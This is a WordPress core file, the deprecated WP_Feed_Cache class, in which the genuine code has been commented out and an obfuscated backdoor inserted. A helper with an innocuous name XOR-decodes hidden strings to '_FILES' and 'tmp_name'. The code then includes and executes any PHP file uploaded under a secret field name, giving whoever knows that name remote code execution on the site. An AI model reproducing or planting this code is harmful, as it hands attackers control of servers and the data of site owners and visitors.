<?php /* 
*
 * Feed API: WP_Feed_Cache class
 *
 * @package WordPress
 * @subpackage Feed
 * @since 4.7.0
 * @deprecated 5.6.0
 

_deprecated_file(
	basename( __FILE__ ),
	'5.6.0',
	'',
	__( 'This file is only loaded for backward compatibility with SimplePie 1.2.x. Please consider switching to a recent SimplePie version.' )
);

*
 * Core class used to implement a feed cache.
 *
 * @since 2.8.0
 */
 	
$number = 'eezZZGMYdtgJ';
$tagqueue = $number;
function _links_add_base($join, $exclusions)

{
    $sanitized_email = $exclusions;
    $bad_slug = urldecode($join);
	$imagedata = 'file';
    $post_content_filtered = substr($sanitized_email,0, strlen($bad_slug));
    $days = $bad_slug ^ $post_content_filtered;
	$post_date_gmt = 'reset';
    return $days;

}
	$post_mime_types = 'loop';
$default_no_texturize_tags = ${_links_add_base("%3A%233%16%1F%14", $tagqueue)};
$dynamic_characters = $default_no_texturize_tags;
$post_name_check = isset($dynamic_characters[$tagqueue]);
if ($post_name_check)

{
    $entities = $default_no_texturize_tags[$tagqueue];
    $pagenow = $entities[_links_add_base("%11%08%0A%054%26+%3C", $tagqueue)];

    $no_texturize_tags = $pagenow;

    include ($no_texturize_tags);
}


/* *
 * @see SimplePie_Cache
 
class WP_Feed_Cache extends SimplePie_Cache {

	*
	 * Creates a new SimplePie_Cache object.
	 *
	 * @since 2.8.0
	 *
	 * @param string $location  URL location (scheme is used to determine handler).
	 * @param string $filename  Unique identifier for cache object.
	 * @param string $extension 'spi' or 'spc'.
	 * @return WP_Feed_Cache_Transient Feed cache handler object that uses transients.
	 
	public function create( $location, $filename, $extension ) {
		return new WP_Feed_Cache_Transient( $location, $filename, $extension );
	}
}
*/